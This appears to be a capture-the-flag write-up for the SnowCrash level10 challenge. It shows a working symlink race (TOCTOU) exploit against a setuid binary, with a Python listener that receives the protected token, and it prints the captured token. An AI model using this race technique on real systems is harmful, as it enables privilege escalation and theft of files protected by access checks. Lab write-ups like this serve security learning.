# Level10

There is an executable file called `level10`. Upon execution:
```
./level10 file host sends file to host if you have access to it
```

After testing some arguments, it seems the executable is expecting a file as the first argument, and a host as the second argument.

Also present in the home directory is a `token` file. Assuming we will pass the token as our first argument, let's create the host for the second argument using python.

```python
import socket
import signal
import sys

HOST = '0.0.0.0'    # Listen on all network interfaces
PORT = 6969         # As hardcoded in the executable

def signal_handler(sig, frame):
    print('Signal received, shutting down server.')
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(1)
    print("Server listening on {}:{}".format(HOST, PORT))
    
    while True:
        conn, addr = s.accept()
        print('New connection:', addr)
        while True:
            data = conn.recv(1024)  # Standard buffer size
            if not data:
                break
            print(data)             # Echo data back to client

if __name__ == '__main__':
    main()

```
Place it somewhere like `/tmp/server.py` and open a new shell to run it. The VM has tmux :)

Now that the server is running, let's try the executable again.
```
level10@SnowCrash:~$ ./level10 token 0.0.0.0
You don't have access to token
```
Let's use a symlink timing exploit to trick the executable into passing the permissions check.
```
echo > /tmp/garbage && while :; do ln -fs /tmp/garbage /tmp/link; ln -fs ~/token /tmp/link; done
```
We'll keep this script running in its own shell as well.
```
level10@SnowCrash:~$ ./level10 /tmp/link 0.0.0.0
You don't have access to /tmp/link
```
Unlucky timing.. keep trying!

```
level10@SnowCrash:~$ ./level10 /tmp/link 0.0.0.0
Connecting to 0.0.0.0:6969 .. Connected!
Sending file .. wrote file!
```
After a few attempts, the output of the server:
```
('New connection:', ('127.0.0.1', 38979))
.*( )*.
woupa2yuojeeaaed06riuj63c
```
Our token! Now we can `su flag10`, `getflag` and `su level11`